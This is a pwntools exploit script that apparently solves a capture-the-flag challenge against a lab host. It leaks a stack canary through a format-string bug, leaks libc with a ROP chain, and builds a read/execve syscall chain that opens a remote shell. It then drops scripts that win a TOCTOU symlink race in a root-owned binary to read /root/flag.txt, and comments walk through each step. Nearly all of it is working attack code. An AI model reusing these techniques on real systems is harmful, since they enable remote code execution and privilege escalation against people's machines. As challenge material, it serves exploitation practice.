from pwn import *

binary = context.binary = ELF('./skynet_console', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

HOST = '192.168.56.102'
PORT = '3663'

# This loop brute forces the format string vulnerability to find the stack canary
for i in range(1, 25):
    try:
        p = remote(HOST, PORT)
        # p = process()
        fmt = f"%{i}$p".encode()
        p.sendlineafter(b"> ", fmt)
        leak = p.recvline().strip()
        p.close()
        
        if b'0x' in leak and leak.endswith(b'00'):
            log.info(f'Possible canary at: %{i}$p, leak is: {leak}')
    except Exception as e:
        log.warning(f"Failed at %{i}$p: {e}")
        

print('-----------------starting exploit-----------------')

# This swaps /tmp/writable/secure_copy with a symbolic link to /root/flag.txt
race_script = '''
cat <<EOF > /tmp/race.sh
#!/bin/sh
while true; do
    rm -f /tmp/writable/secure_copy && ln -s /root/flag.txt /tmp/writable/secure_copy
done
EOF
chmod +x /tmp/race.sh
'''

# This runs /home/ctf/infiltrator_reader continuously until "flag" is in the output
loop_script = '''
cat <<EOF > /tmp/loop.sh
#!/bin/sh
while true; do
    # Replace symlink with real file so lstat() passes
    echo "dummy" > /tmp/writable/secure_copy

    # Run vulnerable binary (will check then fopen)
    /home/ctf/infiltrator_reader /tmp/writable/dummy.txt /tmp/writable/secure_copy 2>/dev/null | grep "flag" && break
done
EOF
chmod +x /tmp/loop.sh
'''

p = remote(HOST, PORT)
# p = process()


# Get the stack canary (use the loop from above to find how far into the stack to look)
p.sendlineafter(b'> ', b'%23$p')
canary = p.recvline().strip().split()[1]
canary = int(canary, 16)
log.success(f'Canary at: {hex(canary)}')


# Leak libc
padding = b'A'*72

rop = ROP(binary)
rop.puts(binary.got['puts'])

# Use ghidra, or any decompiler, to get this address (look for the 'gets' calls)
# There might be other ways to get this address as well but this was the easiest I found
# This is the address for getHumanInput()
rop.call(0x400840)

payload = padding + p64(canary) + b'B'*8 + rop.chain()
p.sendlineafter(b'> ', payload)

puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'Puts at: {hex(puts)}')

libc.address = puts - libc.symbols['puts'] # set the libc base
log.info(f'Libc base at: {hex(libc.address)}')


# Pop shell
# Since the binary is stripped and tighter than usual we need to build the code to pop a shell
# You'll also realize that if you look for "/bin/sh", system(), or execve() in the provided libc you'll see that they've been overwritten
# So, the plan of attack is: 
    # 1. Write "/bin/sh" into the .bss memory region by building ROP chain for read()
    # 2. Build a ROP chain for execve() by calling syscall with the correct registers set
pop_rdi = 0x400993                                  # ROPgadget --binary skynet_console | grep 'pop rdi'
pop_rsi_pop_r15 = 0x400991                          # ROPgadget --binary skynet_console | grep 'pop rsi'
bss_addr = 0x602060                                 # readelf -S skynet_console | grep .bss
pop_rax = next(libc.search(asm('pop rax; ret')))    # since pop rax is not found in the binary we can get it from the provided libc
pop_rdx = next(libc.search(asm('pop rdx; ret')))    # since pop rdx is not found in the binary we can get it from the provided libc
syscall = next(libc.search(asm('syscall; ret')))    # we can also get the syscall command from libc

rop = b'' # start of the payload

# read(0, bss_addr, 8)
rop += p64(pop_rax)
rop += p64(0)                                       # syscall number for read
rop += p64(pop_rdi)
rop += p64(0)                                       # file descriptor = stdin
rop += p64(pop_rsi_pop_r15)
rop += p64(bss_addr)                                # the address of where "/bin/sh" will be
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(8)                                       # size of data to read
rop += p64(syscall)                                 # call read(0, bss_addr, 8)

# execve(bss_addr, 0, 0)
rop += p64(pop_rax)
rop += p64(59)                                      # syscall number for execve
rop += p64(pop_rdi)
rop += p64(bss_addr)                                # use the "/bin/sh" that was written into .bss
rop += p64(pop_rsi_pop_r15)
rop += p64(0)                                       # argv = null
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(0)                                       # envp = null
rop += p64(syscall)                                 # call execve("/bin/sh", 0, 0)

payload = padding + p64(canary) + b'B'*8 + rop

p.sendlineafter(b'> ', b'junk')
p.sendlineafter(b'> ', payload)
p.send(b'/bin/sh\x00') # send "/bin/sh" to the read() call

# By here if you run p.interactive() you will be in the remote shell
# Setup race condition files
p.sendline(race_script.encode())
p.sendline(loop_script.encode())
p.sendline(b'cd /tmp; mkdir writable; echo dummy > writable/dummy.txt')
p.interactive()


# If you cat /home/ctf/infiltrator_reader.c you'll see there is a Time-of-Check to Time-of-Use (TOCTOU) vulnerability
# The vulnerability lies between the last file check and opening the file
# If you look at the permissions on /home/ctf/infiltrator_reader you'll see that it runs as a root user, however it checks file permissions on the current user
# The idea is for the file checks to be on a file that the user owns, and then between the last file check and fopen() that file gets replaced with a symlink to a file that the root owns
# You need the symlink inside a folder in /tmp because modern linux systems prevent root from following symlinks in world-writable directories
# The window for this swap is incredibly tight, so you'll need a race condition in order to swap fast enough
# In /tmp/race.sh you're quickly swapping /tmp/writable/secure_copy with a symlink to /root/flag.txt
# In /tmp/loop.sh you're making sure you have access to /tmp/writable/secure_copy and then calling /home/ctf/infiltrator_reader with that file as what you'll read from
# If /tmp/race.sh is fast enough, it will eventually swap at the right time to hit the race window
# Once you have the shell up you will need to run:
    # /tmp/race.sh &
    # /tmp/loop.sh
# Wait for a bit and eventually you'll see the flag get printed